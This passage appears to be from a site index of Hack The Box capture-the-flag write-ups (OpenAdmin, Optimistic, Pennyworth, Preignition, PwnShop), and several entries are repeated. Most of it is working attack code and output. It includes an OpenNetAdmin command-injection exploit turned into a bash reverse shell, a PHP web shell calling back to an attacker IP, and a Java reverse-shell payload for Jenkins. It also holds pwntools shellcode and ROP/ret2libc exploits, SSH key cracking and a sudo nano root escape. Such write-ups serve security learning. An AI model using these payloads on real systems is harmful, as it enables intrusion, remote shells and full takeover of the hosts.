true ; do echo -n \" $ \" ; read cmd curl --silent -d \"xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \\\"BEGIN\\\"; ${ cmd } ;echo \\\"END\\\"&xajaxargs[]=ping\" \" ${ URL } \" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1 done you can check your burp suite to make sure $ ./47691.sh \"http://10.129.131.235/ona/\" but i want to edit the code so that i can get reverse shell (optional) $ nc -lnvp 433 #!/bin/bash URL = \"http://10.129.131.235/ona/\" cmd = \"bash -c 'bash -i >%26 /dev/tcp/10.10.14.2/443 0>%261'\" curl --silent -d \"xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \\\"BEGIN\\\"; ${ cmd } ;echo \\\"END\\\"&xajaxargs[]=ping\" \" ${ URL } \" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1 www-data@openadmin:/opt/ona/www/local/config$ cat database_settings.inc.php <?php $ona_contexts=array ( 'DEFAULT' => array ( 'databases' => array ( 0 => array ( 'db_type' => 'mysqli', 'db_host' => 'localhost', 'db_login' => 'ona_sys', 'db_passwd' => 'n1nj4W4rri0R!', 'db_database' => 'ona_default', 'db_debug' => false, ), ), 'description' => 'Default data context', 'context_color' => '#D3DBFF', ), ); after all that is password for jimmy ssh $ ssh jimmy@10.129.131.235 jimmy@10.129.131.235's password: n1nj4W4rri0R! jimmy@openadmin:~$ netstat -natp | grep 127.0.0.1 checking the site running in /etc/apache2/sites-enabled there is some website running inside /var/www/internal/ , so to look that locally we need to make it tunnel $ ssh jimmy@10.129.131.235 -L 52846:localhost:52846 also as jimmy we can open /var/www/internal/ and edit that folder so it done with jimmy@openadmin:~$ cd /var/www/internal jimmy@openadmin:/var/www/internal$ echo \"<?php system('id')?>\" > tes.php jimmy@openadmin:/var/www/internal$ # turns out that it run as joanna jimmy@openadmin:/var/www/internal$ echo \"<?php system('cat /home/joanna/user.txt')?>\" > tes.php but i want to edit the code so that i can get reverse shell (optional) $ nc -lnvp 433 jimmy@openadmin:/var/www/internal$ echo \"<?php system(\\\"bash -c 'bash -i >& /dev/tcp/10.10.14.2/443 0>&1'\\\")?>\" > tes.php then open the browser http://localhost:52846/tes.php or use curl when it runs as joanna, we can know the ~/.ssh/id_rsa just cat and save it locally for next ssh $ openssl rsa -in id_rsa -out id_rsa_out Enter pass phrase for joanna-enc: it ask for password and we dont know the password, so try use john $ ssh2john id_rsa > id_rsa_hash $ john -w=/path/to/rockyou.txt id_rsa_hash Using default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status bloodninjas (id_rsa) 1g 0:00:00:04 DONE (2022-06-12 02:12) 0.2369g/s 2268Kp/s 2268Kc/s 2268KC/s bloodoftorii..bloodmoon99 Use the \"--show\" option to display all of the cracked passwords reliably Session completed. $ openssl rsa -in id_rsa -out id_rsa_out Enter pass phrase for joanna-enc: bloodninjas it will out joanna file ssh -i joanna joanna@10.129.131.235 after login ssh with joanna, we can use gtfobins to gain access root privilege using nano , but we need to find which file that have root access after all, we found priv file on /opt/priv that have sudo access $ sudo /bin/nano /opt/priv ^R^X reset; sh 1>&0 2>&0 press enter, and done, it run as root","title":"OpenAdmin"},{"location":"ctf/writeup/htb/htb-openadmin/#openadmin","text":"Easy External Penetration Tester Level 1 OS Command Injection A03:2021-Injection Web Site Structure Discovery Local File Inclusion A07:2021-Identification And Authentication Failures Public Vulnerabilities Password Reuse Enumeration Hard-coded Credentials Authentication Directory Traversal Lateral Movement Weak Credentials Source Code Review Password Cracking Sudo Exploitation $ nmap -sV -sC 10.129.131.235 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-11 15:37 WIB Nmap scan report for 10.129.131.235 Host is up (0.057s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA) | 256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA) |_ 256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 30.61 seconds $ gobuster dir --url http://10.129.131.235/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.129.131.235/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/06/11 16:45:09 Starting gobuster in directory enumeration mode =============================================================== /music (Status: 301) [Size: 316] [--> http://10.129.131.235/music/] Progress: 388 / 87665 (0.44%) ^C [!] Keyboard interrupt detected, terminating. =============================================================== 2022/06/11 16:45:13 Finished =============================================================== there are music directory, then we proceed to the login page here we find that is a OpenNetAdmin , and it said that the website use v18.1.1 version, so i wanna check the vulnerable using searchploit $ searchsploit opennetadmin ------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- OpenNetAdmin 13.03.01 - Remote Code Execution | php/webapps/26682.txt OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit) | php/webapps/47772.rb OpenNetAdmin 18.1.1 - Remote Code Execution | php/webapps/47691.sh ------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results it turns out that there is a RCE vulnerable cat /usr/share/exploitdb/exploits/php/webapps/47691.sh # Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution # Date: 2019-11-19 # Exploit Author: mattpascoe # Vendor Homepage: http://opennetadmin.com/ # Software Link: https://github.com/opennetadmin/ona # Version: v18.1.1 # Tested on: Linux # Exploit Title: OpenNetAdmin v18.1.1 RCE # Date: 2019-11-19 # Exploit Author: mattpascoe # Vendor Homepage: http://opennetadmin.com/ # Software Link: https://github.com/opennetadmin/ona # Version: v18.1.1 # Tested on: Linux #!/bin/bash URL = \" ${ 1 } \" while true ; do echo -n \" $ \" ; read cmd curl --silent -d \"xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \\\"BEGIN\\\"; ${ cmd } ;echo \\\"END\\\"&xajaxargs[]=ping\" \" ${ URL } \" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1 done you can check your burp suite to make sure $ ./47691.sh \"http://10.129.131.235/ona/\" but i want to edit the code so that i can get reverse shell (optional) $ nc -lnvp 433 #!/bin/bash URL = \"http://10.129.131.235/ona/\" cmd = \"bash -c 'bash -i >%26 /dev/tcp/10.10.14.2/443 0>%261'\" curl --silent -d \"xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \\\"BEGIN\\\"; ${ cmd } ;echo \\\"END\\\"&xajaxargs[]=ping\" \" ${ URL } \" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1 www-data@openadmin:/opt/ona/www/local/config$ cat database_settings.inc.php <?php $ona_contexts=array ( 'DEFAULT' => array ( 'databases' => array ( 0 => array ( 'db_type' => 'mysqli', 'db_host' => 'localhost', 'db_login' => 'ona_sys', 'db_passwd' => 'n1nj4W4rri0R!', 'db_database' => 'ona_default', 'db_debug' => false, ), ), 'description' => 'Default data context', 'context_color' => '#D3DBFF', ), ); after all that is password for jimmy ssh $ ssh jimmy@10.129.131.235 jimmy@10.129.131.235's password: n1nj4W4rri0R! jimmy@openadmin:~$ netstat -natp | grep 127.0.0.1 checking the site running in /etc/apache2/sites-enabled there is some website running inside /var/www/internal/ , so to look that locally we need to make it tunnel $ ssh jimmy@10.129.131.235 -L 52846:localhost:52846 also as jimmy we can open /var/www/internal/ and edit that folder so it done with jimmy@openadmin:~$ cd /var/www/internal jimmy@openadmin:/var/www/internal$ echo \"<?php system('id')?>\" > tes.php jimmy@openadmin:/var/www/internal$ # turns out that it run as joanna jimmy@openadmin:/var/www/internal$ echo \"<?php system('cat /home/joanna/user.txt')?>\" > tes.php but i want to edit the code so that i can get reverse shell (optional) $ nc -lnvp 433 jimmy@openadmin:/var/www/internal$ echo \"<?php system(\\\"bash -c 'bash -i >& /dev/tcp/10.10.14.2/443 0>&1'\\\")?>\" > tes.php then open the browser http://localhost:52846/tes.php or use curl when it runs as joanna, we can know the ~/.ssh/id_rsa just cat and save it locally for next ssh $ openssl rsa -in id_rsa -out id_rsa_out Enter pass phrase for joanna-enc: it ask for password and we dont know the password, so try use john $ ssh2john id_rsa > id_rsa_hash $ john -w=/path/to/rockyou.txt id_rsa_hash Using default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status bloodninjas (id_rsa) 1g 0:00:00:04 DONE (2022-06-12 02:12) 0.2369g/s 2268Kp/s 2268Kc/s 2268KC/s bloodoftorii..bloodmoon99 Use the \"--show\" option to display all of the cracked passwords reliably Session completed. $ openssl rsa -in id_rsa -out id_rsa_out Enter pass phrase for joanna-enc: bloodninjas it will out joanna file ssh -i joanna joanna@10.129.131.235 after login ssh with joanna, we can use gtfobins to gain access root privilege using nano , but we need to find which file that have root access after all, we found priv file on /opt/priv that have sudo access $ sudo /bin/nano /opt/priv ^R^X reset; sh 1>&0 2>&0 press enter, and done, it run as root","title":"OpenAdmin"},{"location":"ctf/writeup/htb/htb-optimistic/","text":"Optimistic pwn Intro to Binary Exploitation htb-pwn Bat Optimistic.zip hackthebox $ file optimistic optimistic: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=24f4b065a2eab20657772e85de2af83b2f6fe8b1, for GNU/Linux 3.2.0, not stripped $ checksec --file=optimistic RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE Partial RELRO No canary found NX disabled PIE enabled No RPATH No RUNPATH 78) Symbols No 0 2 optimistic int __cdecl main ( int argc , const char ** argv , const char ** envp ) { int v4 ; // [rsp+0h] [rbp-80h] size_t nbytes ; // [rsp+4h] [rbp-7Ch] __int16 v6 ; // [rsp+Ch] [rbp-74h] char v7 ; // [rsp+Eh] [rbp-72h] char v8 ; // [rsp+Fh] [rbp-71h] __int64 v9 ; // [rsp+10h] [rbp-70h] __int64 v10 ; // [rsp+18h] [rbp-68h] char v11 [ 96 ]; // [rsp+20h] [rbp-60h] __int64 savedregs ; // [rsp+80h] [rbp+0h] initialize (); puts ( \"Welcome to the positive community!\" ); puts ( \"We help you embrace optimism.\" ); printf ( \"Would you like to enroll yourself? (y/n): \" , argv ); v7 = getchar (); getchar (); if ( v7 != 121 ) { puts ( \"Too bad, see you next time :(\" ); v8 = 110 ; exit ( 0 ); } printf ( \"Great! Here's a small welcome gift: %p \\n \" , & savedregs ); puts ( \"Please provide your details.\" ); printf ( \"Email: \" ); v6 = read ( 0 , & v9 , 8uLL ); printf ( \"Age: \" ); HIDWORD ( nbytes ) = read ( 0 , & v10 , 8uLL ); printf ( \"Length of name: \" ); __isoc99_scanf ( \"%d\" , & nbytes ); if ( ( int ) nbytes > 64 ) { puts ( \"Woah there! You shouldn't be too optimistic.\" ); exit ( 0 ); } printf ( \"Name: \" ); v4 = read ( 0 , v11 , ( unsigned int ) nbytes ); LODWORD ( nbytes ) = 0 ; while ( ( int ) nbytes < v4 - 9 ) { if ( ! isalpha ( v11 [( int ) nbytes ]) && ( unsigned int )( v11 [( int ) nbytes ] - 48 ) > 9 ) { puts ( \"Sorry, that's an invalid name.\" ); exit ( 0 ); } LODWORD ( nbytes ) = nbytes + 1 ; } return puts ( \"Thank you! We'll be in touch soon.\" ); } First of all you may need to change the initialize() -> alarm(0x1E) to alarm(0xFF) in order to extend the investigation time. You can use ghex ( sudo apt install ghex ) or other tool to change it. $ ./optimistic Welcome to the positive community! We help you embrace optimism. Would you like to enroll yourself? (y/n): y Great! Here's a small welcome gift: 0x7ffc2e6d8800 Please provide your details. the memory shared 0x7ffc2e6d8800 was the $rbp $ ./optimistic Welcome to the positive community! We help you embrace optimism. Would you like to enroll yourself? (y/n): y Great! Here's a small welcome gift: 0x7ffd32568e50 Please provide your details. Email: qwe Age: 2 Length of name: 3 Name: abcdefg Thank you! We'll be in touch soon. $ defg defg: command not found Input Length of name with -1 , so that we can get the higher available space (due to the unsigned int ) After that, we need to substract the given stack memory with the Name buffer to get the Name address, that is the return address we need point to from pwn import * context . log_level = 'DEBUG' # io = process('./optimistic') url = \"138.68.188.223\" port = 32461 io = remote ( url , port ) # Step 0: Enumerate Binary context ( os = 'linux' , arch = 'amd64' ) padding = 104 # [BUFFER] + [rbp] offset = 96 # [BUFFER] # Step 1: Stack Address io . sendlineafter ( ': ' , 'y' ) io . recvuntil ( ': ' ) stack_address = io . recvline () . decode ()[ 2 :] stack_address = int ( stack_address , 16 ) stack_address -= offset stack_address = p64 ( stack_address ) # Step 2: Payload shellcode = b 'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V' # google: alphanumeric linux /bin/sh 64 bit payload = shellcode + b 'a' * ( 104 - len ( shellcode )) + stack_address # Step 3: Run io . sendline ( b 'abcd' ) io . sendline ( b '1' ) io . sendline ( b '-1' ) io . sendline ( payload ) io . interactive ()","title":"Optimistic"},{"location":"ctf/writeup/htb/htb-pennyworth/","text":"Pennyworth \u00b6 nmap -sV -sT -v <target_ip> PORT STATE SERVICE VERSION 1244/tcp filtered isbconference1 8080/tcp open http Jetty 9.4.39.v20210325 Google search for the default Jenkins login credentials on a fresh install so lucky :) root : password A handbook including multiple ways of gaining Jenkins RCE's A repository similar to the above, including links to scripts and tools we will do some reverse shell, then we need a payload nc -nlvp 8000 String host=\"{your_IP}\"; int port=8000; String cmd=\"/bin/bash\"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()) {while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();","title":"Pennyworth"},{"location":"ctf/writeup/htb/htb-pennyworth/#pennyworth","text":"nmap -sV -sT -v <target_ip> PORT STATE SERVICE VERSION 1244/tcp filtered isbconference1 8080/tcp open http Jetty 9.4.39.v20210325 Google search for the default Jenkins login credentials on a fresh install so lucky :) root : password A handbook including multiple ways of gaining Jenkins RCE's A repository similar to the above, including links to scripts and tools we will do some reverse shell, then we need a payload nc -nlvp 8000 String host=\"{your_IP}\"; int port=8000; String cmd=\"/bin/bash\"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()) {while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();","title":"Pennyworth"},{"location":"ctf/writeup/htb/htb-preignition/","text":"Preignition \u00b6 nmap -sV <ip_target> install gobuster, kali linux already installed sudo apt install golang-go go install github.com/OJ/gobuster/v3@latest sudo git clone https://github.com/OJ/gobuster.git cd gobuster go get && go build go install sudo gobuster dir -w /usr/share/wordlist/dirb/common.txt -u <ip_target>","title":"Preignition"},{"location":"ctf/writeup/htb/htb-preignition/#preignition","text":"nmap -sV <ip_target> install gobuster, kali linux already installed sudo apt install golang-go go install github.com/OJ/gobuster/v3@latest sudo git clone https://github.com/OJ/gobuster.git cd gobuster go get && go build go install sudo gobuster dir -w /usr/share/wordlist/dirb/common.txt -u <ip_target>","title":"Preignition"},{"location":"ctf/writeup/htb/htb-pwnshop/","text":"PwnShop pwn Intro to Binary Exploitation htb-pwn piebase stack pivot ret2libc HTB Console.zip hackthebox Binary Info \u00b6 $ file pwnshop pwnshop: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e354418962cffebad74fa44061f8c58d92c0e706, for GNU/Linux 3.2.0, stripped $ checksec --file=pwnshop RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE Partial RELRO No canary found NX enabled PIE enabled No RPATH No RUNPATH No Symbols No 0 2 pwnshop NX Enabled PIE Enabled Function \u00b6 main buy sell undefined [ 16 ] FUN_001010a0 ( void ) { int iVar1 ; ulong in_RCX ; char cVar2 ; FUN_0010121e (); puts ( \"========= HTB PwnShop ===========\" ); while ( true ) { while ( true ) { puts ( \"What do you wanna do?\" ); printf ( \"1> Buy \\n 2> Sell \\n 3> Exit \\n > \" ); iVar1 = getchar (); getchar (); cVar2 = ( char ) iVar1 ; if ( cVar2 != '2' ) break ; FUN_0010126a (); } if ( cVar2 == '3' ) break ; if ( cVar2 == '1' ) { FUN_0010132a (); } else { puts ( \"Please try again.\" ); } } return ZEXT816 ( in_RCX ) << 0x40 ; } void FUN_0010132a ( void ) { undefined auStack72 [ 72 ]; puts ( \"Sorry, we aren \\' t selling right now.\" ); printf ( \"But you can place a request. \\n Enter details: \" ); read ( 0 , auStack72 , 0x50 ); return ; } void FUN_0010126a ( void ) { int iVar1 ; long lVar2 ; undefined4 * puVar3 ; byte bVar4 ; undefined4 auStack72 [ 8 ]; undefined8 local_28 ; undefined4 * local_20 ; bVar4 = 0 ; local_20 = & DAT_001040c0 ; printf ( \"What do you wish to sell? \" ); local_28 = 0 ; puVar3 = auStack72 ; for ( lVar2 = 8 ; lVar2 != 0 ; lVar2 = lVar2 + -1 ) { * puVar3 = 0 ; puVar3 = puVar3 + ( ulong ) bVar4 * -2 + 1 ; } read ( 0 , auStack72 , 0x1f ); printf ( \"How much do you want for it? \" ); read ( 0 , & local_28 , 8 ); iVar1 = strcmp (( char * ) & local_28 , \"13.37 \\n \" ); if ( iVar1 == 0 ) { puts ( \"Sounds good. Leave details here so I can ask my guy to take a look.\" ); puVar3 = local_20 ; for ( lVar2 = 0x10 ; lVar2 != 0 ; lVar2 = lVar2 + -1 ) { * puVar3 = 0 ; puVar3 = puVar3 + ( ulong ) bVar4 * -2 + 1 ; } read ( 0 , local_20 , 0x40 ); } else { printf ( \"What? %s? The best I can do is 13.37$ \\n \" , & local_28 ); } return ; } Run Program \u00b6 $ cyclic 100 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa $ ./pwnshop ========= HTB PwnShop =========== What do you wanna do? 1> Buy 2> Sell 3> Exit > 1 Sorry, we aren't selling right now. But you can place a request. Enter details: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa zsh: segmentation fault ./pwnshop $ uaaavaaawaaaxaaayaaa uaaavaaawaaaxaaayaaa: command not found $ cyclic -l uaaa 80 $ ./pwnshop ========= HTB PwnShop =========== What do you wanna do? 1> Buy 2> Sell 3> Exit > 2 What do you wish to sell? test How much do you want for it? aaaabbbb What? aaaabbbb\ufffd\ufffdUUUU? The best I can do is 13.37$ What do you wanna do? 1> Buy 2> Sell 3> Exit > from running the program, we can get that buy has offset 80 character, and sell has vuln output strings aaaabbbb\ufffd\ufffdUUUU Idea \u00b6 Leak binary address \u00b6 from sell , we have local_20 = &DAT_001040c0; and read(0,&local_28,8); that we can exploit string aaaabbbb\ufffd\ufffdUUUU has vuln on \ufffd\ufffdUUUU , that the address of .bss( local_20 ) which is the next value of local_28 we need to get hex of \ufffd\ufffdUUUU , then substact with 0x40c0 (local_28 offset address) so that we can get the piebase address io . recv () . decode () io . sendline ( b '2' ) io . recv () . decode () io . sendline ( b 'test' ) io . recv () . decode () leak_pad = b 'a' * 8 io . send ( leak_pad ) resp = io . recv () binary_offset = resp . split ( leak_pad )[ 1 ] binary_offset = binary_offset . split ( b '?' )[ 0 ] binary_offset = bytearray ( binary_offset ) . ljust ( 8 , b ' \\x00 ' ) binary_offset = u64 ( binary_offset , endian = \"little\" ) binary_offset -= 0x40c0 # got from local_20 = &DAT_001040c0; print ( 'piebase :' , hex ( binary_offset )) Leaking LIBC \u00b6 from buy , we have buffer overflow 80 characters, we can use it for leaking the libc address. we can add payload like image bellow, run in GDB and put break point at buy return so that we can know the process behind (not so necessary). the main idea is print(puts) the libc address, we can use pop_rdi to store the parameter ( got_puts ) and call plt_puts . we use got_puts because it stores puts_libc address. buy function because we need to continue our program, we dont want to stop(segmentation fault) our program $ ropper --file pwnshop --search \"pop rdi\" [INFO] Load gadgets from cache [LOAD] loading... 100% [LOAD] removing double gadgets... 100% [INFO] Searching for gadgets: pop rdi [INFO] File: pwnshop 0x00000000000013c3: pop rdi; ret; $ ropper --file pwnshop --search \"sub\" [INFO] Load gadgets from cache [LOAD] loading... 100% [LOAD] removing double gadgets... 100% [INFO] Searching for gadgets: sub [INFO] File: pwnshop 0x000000000000121a: sub esp, 0x28; ret; 0x00000000000013dd: sub esp, 8; add rsp, 8; ret; 0x0000000000001005: sub esp, 8; mov rax, qword ptr [rip + 0x2fd9]; test rax, rax; je 0x1016; call rax; 0x0000000000001219: sub rsp, 0x28; ret; 0x00000000000013dc: sub rsp, 8; add rsp, 8; ret; 0x0000000000001004: sub rsp, 8; mov rax, qword ptr [rip + 0x2fd9]; test rax, rax; je 0x1016; call rax; we will use 0x13c3 as pop_rdi and 0x1219 (to get more space in stack) as sub_rsp. you can get got_puts , plt_puts , and buy_func offset from some tools like ghidra pop_rdi = p64 ( binary_offset + 0x13c3 ) got_puts = p64 ( binary_offset + 0x4018 ) plt_puts = p64 ( binary_offset + 0x1030 ) buy_func = p64 ( binary_offset + 0x132a ) padding_to_rop_chain = 40 * b 'a' # 0x50(ret) - 0x28(sub rsp, 0x28; ret) rop_chain = pop_rdi + got_puts + plt_puts + buy_func padding_to_stack_pivot = ( 72 - len ( padding_to_rop_chain ) - len ( rop_chain )) * b 'b' sub_rsp = p64 ( binary_offset + 0x1219 ) # sub rsp, 0x28; ret payload = padding_to_rop_chain + rop_chain + padding_to_stack_pivot + sub_rsp io . sendline ( b '1' ) io . recv () io . send ( payload ) output = io . recv () leaked_puts_libc = output [: 6 ] leaked_puts_libc = bytearray ( leaked_puts_libc ) . ljust ( 8 , b ' \\x00 ' ) leaked_puts_libc = u64 ( leaked_puts_libc , endian = \"little\" ) print ( 'puts@GLIBC :' , hex ( leaked_puts_libc )) this will print puts_libc address, then we need to find system and /bin/sh in libc, so that we can run buy again and redirect to system('/bin/sh') Find offset in LIBC \u00b6 after running the source code and comparing with remote does, we get $ python get_flag.py [+] Starting local process './pwnshop': pid 178594 piebase : 0x555555554000 puts@GLIBC : 0x7ffff7e47e10 $ python get_flag.py [+] Opening connection to 159.65.19.24 on port 32300: Done piebase : 0x558f796d4000 puts@GLIBC : 0x7f1baa0eb6a0 the offset is different, it happens because the libc we use can be different from the libc remote, so we need to check what libc remote is using. https://libc.blukat.me/?q=puts%3A6a0 , after trying we know that libc remote uses libc6_2.23-0ubuntu11.2_amd64 with that information, we can define the system and /bin/sh offset. then we can copy the appropriate offset libc_puts = 0x06f6a0 libc_system = 0x0453a0 libc_sh = 0x18ce17 libc_offset = leaked_puts_libc - libc_puts system = p64 ( libc_offset + libc_system ) print ( 'system :' , hex ( u64 ( system ))) sh = p64 ( libc_offset + libc_sh ) print ( '/bin/sh :' , hex ( u64 ( sh ))) send the payload rop_chain = pop_rdi + sh + system padding_to_stack_pivot = ( 72 - len ( padding_to_rop_chain ) - len ( rop_chain )) * b 'b' payload = padding_to_rop_chain + rop_chain + padding_to_stack_pivot + sub_rsp io . send ( payload ) io . interactive () Exploit \u00b6 $ python get_flag.py [+] Opening connection to 159.65.19.24 on port 32300: Done piebase : 0x5635239db000 puts@GLIBC : 0x7fc5098b46a0 system : 0x7fc50988a3a0 /bin/sh : 0x7fc5099d1e17 [*] Switching to interactive mode $ id uid=0(root) gid=0(root) groups=0(root) $ Full Code \u00b6 dont just copy paste, learning the basics is more important! from pwn import * def main (): url = \"159.65.19.24\" port = 32300 io = remote ( url , port ) # io = process('./pwnshop') # Step 1: Leak binary address io . recv () . decode () io . sendline ( b '2' ) io . recv () . decode () io . sendline ( b 'test' ) io . recv () . decode () leak_pad = b 'a' * 8 io . send ( leak_pad ) resp = io . recv () binary_offset = resp . split ( leak_pad )[ 1 ] binary_offset = binary_offset . split ( b '?' )[ 0 ] binary_offset = bytearray ( binary_offset ) . ljust ( 8 , b ' \\x00 ' ) binary_offset = u64 ( binary_offset , endian = \"little\" ) binary_offset -= 0x40c0 # got from local_20 = &DAT_001040c0; print ( 'piebase :' , hex ( binary_offset )) # Step 2: Leaking LIBC pop_rdi = p64 ( binary_offset + 0x13c3 ) got_puts = p64 ( binary_offset + 0x4018 ) plt_puts = p64 ( binary_offset + 0x1030 ) buy_func = p64 ( binary_offset + 0x132a ) padding_to_rop_chain = 40 * b 'a' # 0x50(ret) - 0x28(sub rsp, 0x28; ret) rop_chain = pop_rdi + got_puts + plt_puts + buy_func padding_to_stack_pivot = ( 72 - len ( padding_to_rop_chain ) - len ( rop_chain )) * b 'b' sub_rsp = p64 ( binary_offset + 0x1219 ) # sup rsp, 0x28; ret payload = padding_to_rop_chain + rop_chain + padding_to_stack_pivot + sub_rsp io . sendline ( b '1' ) io . recv () io . send ( payload ) output = io . recv () leaked_puts_libc = output [: 6 ] leaked_puts_libc = bytearray ( leaked_puts_libc ) . ljust ( 8 , b ' \\x00 ' ) leaked_puts_libc = u64 ( leaked_puts_libc , endian = \"little\" ) print ( 'puts@GLIBC :' , hex ( leaked_puts_libc )) # print(output) # Step 3: Find offset in LIBC ### Local # libc_puts = 0x75e10 # libc_system = 0x49860 # libc_sh = 0x198882 ### Remote (libc6_2.23-0ubuntu11.2_amd64) libc_puts = 0x06f6a0 libc_system = 0x0453a0 libc_sh = 0x18ce17 libc_offset = leaked_puts_libc - libc_puts system = p64 ( libc_offset + libc_system ) print ( 'system :' , hex ( u64 ( system ))) sh = p64 ( libc_offset + libc_sh ) print ( '/bin/sh :' , hex ( u64 ( sh ))) # Step 4: Exploit rop_chain = pop_rdi + sh + system padding_to_stack_pivot = ( 72 - len ( padding_to_rop_chain ) - len ( rop_chain )) * b 'b' payload = padding_to_rop_chain + rop_chain + padding_to_stack_pivot + sub_rsp io . send ( payload ) io . interactive () if __name__ == '__main__' : main ()","title":"PwnShop"},{"location":"ctf/writeup/htb/htb-pwnshop/#binary-info","text":"$ file pwnshop pwnshop: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e354418962cffebad74fa44061f8c58d92c0e706, for GNU/Linux 3.2.0, stripped $ checksec --file=pwnshop RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE Partial RELRO No canary found NX enabled PIE enabled No RPATH No RUNPATH No Symbols No 0 2 pwnshop NX Enabled PIE Enabled","title":"Binary Info"},{"location":"ctf/writeup/htb/htb-pwnshop/#function","text":"main buy sell undefined [ 16 ] FUN_001010a0 ( void ) { int iVar1 ; ulong in_RCX ; char cVar2 ; FUN_0010121e (); puts ( \"========= HTB PwnShop ===========\" ); while ( true ) { while ( true ) { puts ( \"What do you wanna do?\" ); printf ( \"1> Buy \\n 2> Sell \\n 3> Exit \\n > \" ); iVar1 = getchar (); getchar (); cVar2 = ( char ) iVar1 ; if ( cVar2 != '2' ) break ; FUN_0010126a (); } if ( cVar2 == '3' ) break ; if ( cVar2 == '1' ) { FUN_0010132a (); } else { puts ( \"Please try again.\" ); } } return ZEXT816 ( in_RCX ) << 0x40 ; } void FUN_0010132a ( void ) { undefined auStack72 [ 72 ]; puts ( \"Sorry, we aren \\' t selling right now.\" ); printf ( \"But you can place a request. \\n Enter details: \" ); read ( 0 , auStack72 , 0x50 ); return ; } void FUN_0010126a ( void ) { int iVar1 ; long lVar2 ; undefined4 * puVar3 ; byte bVar4 ; undefined4 auStack72 [ 8 ]; undefined8 local_28 ; undefined4 * local_20 ; bVar4 = 0 ; local_20 = & DAT_001040c0 ; printf ( \"What do you wish to sell? \" ); local_28 = 0 